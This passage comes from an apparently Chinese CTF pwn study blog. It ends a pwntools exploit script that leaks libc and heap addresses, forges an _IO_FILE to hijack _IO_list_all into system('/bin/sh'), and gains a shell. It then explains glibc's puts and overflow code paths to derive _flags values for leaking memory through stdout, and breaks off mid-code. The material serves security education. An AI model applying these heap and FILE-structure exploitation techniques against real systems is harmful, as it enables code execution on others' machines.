class="number">0x1234</span>,<span class="number">0xDDAA</span>)</span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x30</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x21</span>)+p64(<span class="number">0x0000ddaa00001234</span>)+p64(<span class="number">0</span>)+p64(<span class="number">0</span>)+p64(<span class="number">0xf81</span>)</span><br><span class="line">edit(<span class="built_in">len</span>(payload),payload,<span class="number">0x1234</span>,<span class="number">0xDDAA</span>)</span><br><span class="line">add(<span class="number">0x1000</span>,<span class="string">b&#x27;bbbb&#x27;</span>,<span class="number">0x1234</span>,<span class="number">0xDDAA</span>)</span><br><span class="line">dbg()</span><br><span class="line">add(<span class="number">0x400</span>,<span class="string">b&#x27;aaaaaaaa&#x27;</span>,<span class="number">0x1234</span>,<span class="number">0xDDAA</span>)</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">show()</span><br><span class="line"></span><br><span class="line">libc_base=u64(r.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">0x3c5188</span></span><br><span class="line">system=libc_base+<span class="number">0x453a0</span></span><br><span class="line">_IO_list_all=libc_base+<span class="number">0x3c5520</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#print(f&quot;libc_base is &#123;libc_base&#125;,system is &#123;system&#125;,_IO_list_all is &#123;_IO-list_all&#125;&quot;)</span></span><br><span class="line"></span><br><span class="line">edit(<span class="number">0x10</span>,<span class="string">b&#x27;b&#x27;</span>*<span class="number">0x10</span>,<span class="number">0x1234</span>,<span class="number">0xDDAA</span>)</span><br><span class="line">show()</span><br><span class="line">r.recvuntil(<span class="string">&#x27;b&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line">heap = u64(r.recvuntil(<span class="string">&#x27;\n&#x27;</span>).strip().ljust(<span class="number">8</span>, <span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">heap_base = heap - <span class="number">0xE0</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span> * <span class="number">0x400</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x21</span>) + p32(<span class="number">666</span>) + p32(<span class="number">0xddaa</span>) + p64(<span class="number">0</span>)</span><br><span class="line">fake_file = <span class="string">&#x27;/bin/sh\x00&#x27;</span>+p64(<span class="number">0x61</span>)<span class="comment">#to small bin</span></span><br><span class="line">fake_file += p64(<span class="number">0</span>)+p64(_IO_list_all-<span class="number">0x10</span>)</span><br><span class="line">fake_file += p64(<span class="number">0</span>) + p64(<span class="number">1</span>)<span class="comment">#_IO_write_base &lt; _IO_write_ptr</span></span><br><span class="line">fake_file = fake_file.ljust(<span class="number">0xc0</span>,<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_file += p64(<span class="number">0</span>) * <span class="number">3</span></span><br><span class="line">fake_file += p64(heap_base+<span class="number">0x5E8</span>) <span class="comment">#vtable ptr</span></span><br><span class="line">fake_file += p64(<span class="number">0</span>) * <span class="number">2</span></span><br><span class="line">fake_file += p64(system)</span><br><span class="line">payload += fake_file</span><br><span class="line">edit(<span class="built_in">len</span>(payload), payload, <span class="number">666</span>, <span class="number">2</span>)</span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line">r.recvuntil(<span class="string">&quot;Your choice : &quot;</span>)</span><br><span class="line">r.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><p>刚开始是对这里chunk分配有些迷惑的，不过后来看了一篇文章，关于lastreminder有所想法 <a href="https://blog.csdn.net/qq_41453285/article/details/97803141">last reminder</a></p><h4 id="利用-IO-2-1-stdout-泄露libc"><a href="#利用-IO-2-1-stdout-泄露libc" class="headerlink" title="利用__IO_2_1_stdout_ 泄露libc"></a>利用__IO_2_1_stdout_ 泄露libc</h4><p>有些时候题目中没有给出我们输出程序，但是我们需要泄露libc等内容，这时候就要利用io来泄露</p><p><img src="/../images/20210218150610948-1693969452453.png" alt="io"></p><p>在程序运行时，会自动开启三个io流，分别是 <em>stdin，stdout，stderr</em> ,文件描述符分别为0,1,2</p><p>这里再复习一下io的结构体</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE_plus</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  _IO_FILE file;</span><br><span class="line">  <span class="type">const</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span> *<span class="title">vtable</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>对于vtable有</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    JUMP_FIELD(<span class="type">size_t</span>, __dummy);</span><br><span class="line">    JUMP_FIELD(<span class="type">size_t</span>, __dummy2);</span><br><span class="line">    JUMP_FIELD(_IO_finish_t, __finish);</span><br><span class="line">    JUMP_FIELD(_IO_overflow_t, __overflow);</span><br><span class="line">    JUMP_FIELD(_IO_underflow_t, __underflow);</span><br><span class="line">    JUMP_FIELD(_IO_underflow_t, __uflow);</span><br><span class="line">    JUMP_FIELD(_IO_pbackfail_t, __pbackfail);</span><br><span class="line">    <span class="comment">/* showmany */</span></span><br><span class="line">    JUMP_FIELD(_IO_xsputn_t, __xsputn);</span><br><span class="line">    JUMP_FIELD(_IO_xsgetn_t, __xsgetn);</span><br><span class="line">    JUMP_FIELD(_IO_seekoff_t, __seekoff);</span><br><span class="line">    JUMP_FIELD(_IO_seekpos_t, __seekpos);</span><br><span class="line">    JUMP_FIELD(_IO_setbuf_t, __setbuf);</span><br><span class="line">    JUMP_FIELD(_IO_sync_t, __sync);</span><br><span class="line">    JUMP_FIELD(_IO_doallocate_t, __doallocate);</span><br><span class="line">    JUMP_FIELD(_IO_read_t, __read);</span><br><span class="line">    JUMP_FIELD(_IO_write_t, __write);</span><br><span class="line">    JUMP_FIELD(_IO_seek_t, __seek);</span><br><span class="line">    JUMP_FIELD(_IO_close_t, __close);</span><br><span class="line">    JUMP_FIELD(_IO_stat_t, __stat);</span><br><span class="line">    JUMP_FIELD(_IO_showmanyc_t, __showmanyc);</span><br><span class="line">    JUMP_FIELD(_IO_imbue_t, __imbue);</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> 0</span></span><br><span class="line">    get_column;</span><br><span class="line">    set_column;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h5 id="flag-规则"><a href="#flag-规则" class="headerlink" title="_flag 规则"></a><em>_flag</em> 规则</h5><p><em>flag</em> 的高两位是由libc确定，低位由文件性质决定</p><p><img src="/../images/1693975592799.png" alt="1693975592799"></p><h5 id="puts函数的执行流程"><a href="#puts函数的执行流程" class="headerlink" title="puts函数的执行流程"></a>puts函数的执行流程</h5><p><em>_IO_puts</em>-&gt;_<em>IO_new_file_xsputn</em></p><p><img src="/../images/1693975724051.png" alt="1693975724051"></p><p><em>_IO_sputn</em> 是一个宏，指向了 <em>_IO_new_file_xsputn</em></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">size_t</span></span><br><span class="line">_IO_new_file_xsputn (FILE *f, <span class="type">const</span> <span class="type">void</span> *data, <span class="type">size_t</span> n)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *s = (<span class="type">const</span> <span class="type">char</span> *) data;</span><br><span class="line">  <span class="type">size_t</span> to_do = n;</span><br><span class="line">  <span class="type">int</span> must_flush = <span class="number">0</span>;</span><br><span class="line">  <span class="type">size_t</span> count = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (n &lt;= <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  <span class="comment">/* This is an optimized implementation.</span></span><br><span class="line"><span class="comment">     If the amount to be written straddles a block boundary</span></span><br><span class="line"><span class="comment">     (or the filebuf is unbuffered), use sys_write directly. */</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* First figure out how much space is available in the buffer. */</span></span><br><span class="line">  <span class="keyword">if</span> ((f-&gt;_flags &amp; _IO_LINE_BUF) &amp;&amp; (f-&gt;_flags &amp; _IO_CURRENTLY_PUTTING))</span><br><span class="line">    &#123;</span><br><span class="line">      count = f-&gt;_IO_buf_end - f-&gt;_IO_write_ptr;</span><br><span class="line">      <span class="keyword">if</span> (count &gt;= n)<span class="comment">//缓冲区长度大于数据长度</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *p;</span><br><span class="line">  <span class="keyword">for</span> (p = s + n; p &gt; s; )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> (*--p == <span class="string">&#x27;\n&#x27;</span>)<span class="comment">//寻找数据的结尾，并更新为count</span></span><br><span class="line">&#123;</span><br><span class="line">  count = p - s + <span class="number">1</span>;</span><br><span class="line">  must_flush = <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> (f-&gt;_IO_write_end &gt; f-&gt;_IO_write_ptr)</span><br><span class="line">    count = f-&gt;_IO_write_end - f-&gt;_IO_write_ptr; <span class="comment">/* Space available. */</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Then fill the buffer. */</span></span><br><span class="line">  <span class="keyword">if</span> (count &gt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> (count &gt; to_do)</span><br><span class="line">count = to_do;</span><br><span class="line">      f-&gt;_IO_write_ptr = __mempcpy (f-&gt;_IO_write_ptr, s, count);</span><br><span class="line">      s += count;</span><br><span class="line">      to_do -= count;<span class="comment">//to_do = 0</span></span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">if</span> (to_do + must_flush &gt; <span class="number">0</span>)<span class="comment">//刷新缓冲区</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="type">size_t</span> block_size, do_write;</span><br><span class="line">      <span class="comment">/* Next flush the (full) buffer. */</span></span><br><span class="line">      <span class="keyword">if</span> (_IO_OVERFLOW (f, EOF) == EOF)</span><br><span class="line"><span class="comment">/* If nothing else has to be written we must not signal the</span></span><br><span class="line"><span class="comment">   caller that everything has been written.  */</span></span><br><span class="line"><span class="keyword">return</span> to_do == <span class="number">0</span> ? EOF : n - to_do;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* Try to maintain alignment: write a whole number of blocks.  */</span></span><br><span class="line">      block_size = f-&gt;_IO_buf_end - f-&gt;_IO_buf_base;</span><br><span class="line">      do_write = to_do - (block_size &gt;= <span class="number">128</span> ? to_do % block_size : <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (do_write)</span><br><span class="line">&#123;</span><br><span class="line">  count = new_do_write (f, s, do_write);</span><br><span class="line">  to_do -= count;</span><br><span class="line">  <span class="keyword">if</span> (count &lt; do_write)</span><br><span class="line">    <span class="keyword">return</span> n - to_do;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* Now write out the remainder.  Normally, this will fit in the</span></span><br><span class="line"><span class="comment"> buffer, but it&#x27;s somewhat messier for line-buffered files,</span></span><br><span class="line"><span class="comment"> so we let _IO_default_xsputn handle the general case. */</span></span><br><span class="line">      <span class="keyword">if</span> (to_do)</span><br><span class="line">to_do -= _IO_default_xsputn (f, s+do_write, to_do);</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">return</span> n - to_do;</span><br><span class="line">&#125;</span><br><span class="line">libc_hidden_ver (_IO_new_file_xsputn, _IO_file_xsputn)</span><br></pre></td></tr></table></figure><p>真羡慕大爹们能读下去源码，我只能看大爹们分析好的，上面的源码大概实现了下面几个步骤</p><ol><li>判断缓冲区还有多少空间，这里通过 <code>f-&gt;_IO_buf_end - f-&gt;_IO_write_ptr</code> 实现</li><li>判断count与n的大小，若是缓冲区有剩余，则把count更新为数据的长度，同时设定 <code>must_flush</code> </li><li>如果缓冲区有数据（即  count&gt;0） ,判断count与to_do的长度，如果长度足够，就更新count为to_do的长度，并设置to_do为0</li><li>若缓冲区有剩余&#x2F;缓冲区已经满，就调用 <em>_IO_OVERFLOW</em> 刷新缓冲区</li><li>do_write</li></ol><p>现在我们已经进入到了 <em>_IO_OVERFLOW</em> 了，之后会调用 <em>_IO_new_fileoverflow</em> </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span></span><br><span class="line">_IO_new_file_overflow (FILE *f, <span class="type">int</span> ch)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (f-&gt;_flags &amp; _IO_NO_WRITES) <span class="comment">/* SET ERROR */</span></span><br><span class="line">    &#123;</span><br><span class="line">      f-&gt;_flags |= _IO_ERR_SEEN;</span><br><span class="line">      __set_errno (EBADF);</span><br><span class="line">      <span class="keyword">return</span> EOF;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="comment">/* If currently reading or no buffer allocated. */</span></span><br><span class="line">  <span class="keyword">if</span> ((f-&gt;_flags &amp; _IO_CURRENTLY_PUTTING) == <span class="number">0</span> || f-&gt;_IO_write_base == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* Allocate a buffer if needed. */</span></span><br><span class="line">      <span class="keyword">if</span> (f-&gt;_IO_write_base == <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line">  _IO_doallocbuf (f);</span><br><span class="line">  _IO_setg (f, f-&gt;_IO_buf_base, f-&gt;_IO_buf_base, f-&gt;_IO_buf_base);</span><br><span class="line">&#125;</span><br><span class="line">      <span class="comment">/* Otherwise must be currently reading.</span></span><br><span class="line"><span class="comment"> If _IO_read_ptr (and hence also _IO_read_end) is at the buffer end,</span></span><br><span class="line"><span class="comment"> logically slide the buffer forwards one block (by setting the</span></span><br><span class="line"><span class="comment"> read pointers to all point at the beginning of the block).  This</span></span><br><span class="line"><span class="comment"> makes room for subsequent output.</span></span><br><span class="line"><span class="comment"> Otherwise, set the read pointers to _IO_read_end (leaving that</span></span><br><span class="line"><span class="comment"> alone, so it can continue to correspond to the external position). */</span></span><br><span class="line">      <span class="keyword">if</span> (__glibc_unlikely (_IO_in_backup (f)))</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">size_t</span> nbackup = f-&gt;_IO_read_end - f-&gt;_IO_read_ptr;</span><br><span class="line">  _IO_free_backup_area (f);</span><br><span class="line">  f-&gt;_IO_read_base -= MIN (nbackup,</span><br><span class="line">   f-&gt;_IO_read_base - f-&gt;_IO_buf_base);</span><br><span class="line">  f-&gt;_IO_read_ptr = f-&gt;_IO_read_base;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (f-&gt;_IO_read_ptr == f-&gt;_IO_buf_end)</span><br><span class="line">f-&gt;_IO_read_end = f-&gt;_IO_read_ptr = f-&gt;_IO_buf_base;</span><br><span class="line">      f-&gt;_IO_write_ptr = f-&gt;_IO_read_ptr;</span><br><span class="line">      f-&gt;_IO_write_base = f-&gt;_IO_write_ptr;</span><br><span class="line">      f-&gt;_IO_write_end = f-&gt;_IO_buf_end;</span><br><span class="line">      f-&gt;_IO_read_base = f-&gt;_IO_read_ptr = f-&gt;_IO_read_end;</span><br><span class="line"></span><br><span class="line">      f-&gt;_flags |= _IO_CURRENTLY_PUTTING;</span><br><span class="line">      <span class="keyword">if</span> (f-&gt;_mode &lt;= <span class="number">0</span> &amp;&amp; f-&gt;_flags &amp; (_IO_LINE_BUF | _IO_UNBUFFERED))</span><br><span class="line">f-&gt;_IO_write_end = f-&gt;_IO_write_ptr;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">if</span> (ch == EOF)</span><br><span class="line">    <span class="keyword">return</span> _IO_do_write (f, f-&gt;_IO_write_base,</span><br><span class="line"> f-&gt;_IO_write_ptr - f-&gt;_IO_write_base);</span><br><span class="line">  <span class="keyword">if</span> (f-&gt;_IO_write_ptr == f-&gt;_IO_buf_end ) <span class="comment">/* Buffer is really full */</span></span><br><span class="line">    <span class="keyword">if</span> (_IO_do_flush (f) == EOF)</span><br><span class="line">      <span class="keyword">return</span> EOF;</span><br><span class="line">  *f-&gt;_IO_write_ptr++ = ch;</span><br><span class="line">  <span class="keyword">if</span> ((f-&gt;_flags &amp; _IO_UNBUFFERED)</span><br><span class="line">      || ((f-&gt;_flags &amp; _IO_LINE_BUF) &amp;&amp; ch == <span class="string">&#x27;\n&#x27;</span>))</span><br><span class="line">    <span class="keyword">if</span> (_IO_do_write (f, f-&gt;_IO_write_base,</span><br><span class="line">      f-&gt;_IO_write_ptr - f-&gt;_IO_write_base) == EOF)</span><br><span class="line">      <span class="keyword">return</span> EOF;</span><br><span class="line">  <span class="keyword">return</span> (<span class="type">unsigned</span> <span class="type">char</span>) ch;</span><br><span class="line">&#125;</span><br><span class="line">libc_hidden_ver (_IO_new_file_overflow, _IO_file_overflow)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>我们最终的目的是利用 <em>_IO_do_write</em> 那么我们就要一步步的绕过判断</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (f-&gt;_flags &amp; _IO_NO_WRITES) <span class="comment">/* SET ERROR */</span></span><br><span class="line">&#123;</span><br><span class="line">      f-&gt;_flags |= _IO_ERR_SEEN;</span><br><span class="line">      __set_errno (EBADF);</span><br><span class="line">      <span class="keyword">return</span> EOF;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>首先是这里，对 <code>f-&gt;_flags &amp; _IO_NO_WRITES</code> 若为真，就会报错，所以有如下关系</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_MAGIC 0xFBAD0000</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_NO_WRITES 8</span></span><br><span class="line">_flags &amp; _IO_NO_WRITES = <span class="number">0</span> </span><br><span class="line">_flags = <span class="number">0xfbad0000</span></span><br></pre></td></tr></table></figure><p>接下来看第二个if</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ((f-&gt;_flags &amp; _IO_CURRENTLY_PUTTING) == <span class="number">0</span> || f-&gt;_IO_write_base == <span class="literal">NULL</span>)</span><br></pre></td></tr></table></figure><p>这里检测缓冲区是否为空，如果是空就进行初始化，如果初始化那我们之前的布局就没效果了，所以为了不进入这里，我们需要</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_MAGIC 0xFBAD0000</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_CURRENTLY_PUTTING 0x800</span></span><br><span class="line">f-&gt;_flags &amp; _IO_CURRENTLY_PUTTING = <span class="number">1</span></span><br><span class="line">_flags = <span class="number">0xfbad0800</span></span><br></pre></td></tr></table></figure><p>这样子我们就进入了 _<em>IO_do_write</em> </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span></span><br><span class="line">_IO_new_do_write (FILE *fp, <span class="type">const</span> <span class="type">char</span> *data, <span class="type">size_t</span> to_do)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> (to_do == <span class="number">0</span></span><br><span class="line">  || (<span class="type">size_t</span>) new_do_write (fp, data, to_do) == to_do) ? <span class="number">0</span> : EOF;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>（终于快结束了，好痛苦啊）</p><p>这里就没什么说的了，直接进入了 <em>new_do_write</em> </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">size_t</span></span><br><span class="line"><span class="title function_">new_do_write</span> <span class="params">(FILE *fp, <span class="type">const</span> <span class="type">char</span> *data, <span class="type">size_t</span> to_do)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">size_t</span> count;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_flags &amp; _IO_IS_APPENDING)</span><br><span class="line">    <span class="comment">/* On a system without a proper O_APPEND implementation,</span></span><br><span class="line"><span class="comment">       you would need to sys_seek(0, SEEK_END) here, but is</span></span><br><span class="line"><span class="comment">       not needed nor desirable for Unix- or Posix-like systems.</span></span><br><span class="line"><span class="comment">       Instead, just indicate that offset (before and after) is</span></span><br><span class="line"><span class="comment">       unpredictable. */</span></span><br><span class="line">    fp-&gt;_offset = _IO_pos_BAD;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> (fp-&gt;_IO_read_end != fp-&gt;_IO_write_base)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="type">off64_t</span> new_pos</span><br><span class="line">= _IO_SYSSEEK (fp, fp-&gt;_IO_write_base - fp-&gt;_IO_read_end, <span class="number">1</span>);</span><br><span class="line">      <span class="keyword">if</span> (new_pos == _IO_pos_BAD)</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">      fp-&gt;_offset = new_pos;</span><br><span class="line">    &#125;</span><br><span class="line">  count = _IO_SYSWRITE (fp, data, to_do);</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_cur_column &amp;&amp; count)</span><br><span class="line">    fp-&gt;_cur_column = _IO_adjust_column (fp-&gt;_cur_column - <span class="number">1</span>, data, count) + <span class="number">1</span>;</span><br><span class="line">  _IO_setg (fp, fp-&gt;_IO_buf_base, fp-&gt;_IO_buf_base, fp-&gt;_IO_buf_base);</span><br><span class="line">  fp-&gt;_IO_write_base = fp-&gt;_IO_write_ptr = fp-&gt;_IO_buf_base;</span><br><span class="line">  fp-&gt;_IO_write_end = (fp-&gt;_mode &lt;= <span class="number">0</span></span><br><span class="line">       &amp;&amp; (fp-&gt;_flags &amp; (_IO_LINE_BUF | _IO_UNBUFFERED))</span><br><span class="line">       ? fp-&gt;_IO_buf_base : fp-&gt;_IO_buf_end);</span><br><span class="line">  <span class="keyword">return</span> count;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里我们选择进入if分支，因为else if中很多是不可控的，不太稳定，若进入if只需要</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_MAGIC 0xFBAD0000</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_IS_APPENDING 0x1000</span></span><br><span class="line">fp-&gt;_flags &amp; _IO_IS_APPENDING = <span class="number">1</span></span><br><span class="line">_flags = <span class="number">0xfbad1000</span></span><br></pre></td></tr></table></figure><p>综上，我们想要通过io来泄露libc只需要</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">_flag=<span class="number">0xfbad1000</span></span><br><span class="line"><span class="comment">/*设置_IO_write_base指向想要泄露的位置，_IO_write_ptr指向泄露结束的地址(不需要一定设置指向结尾，程序中自带地址足够泄露libc*/</span></span><br><span class="line"><span class="comment">/*一般来说直接覆盖_IO_write_base的最低位是\x00就可以了*/</span></span><br></pre></td></tr></table></figure><h4 id="利用-IO-2-1-stdin-任意地址写"><a href="#利用-IO-2-1-stdin-任意地址写" class="headerlink" title="利用__IO_2_1_stdin_ 任意地址写"></a>利用__IO_2_1_stdin_ 任意地址写</h4><p>既然有stdout让我们任意地址读，那同样的也有任意地址写，继续来看源码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span 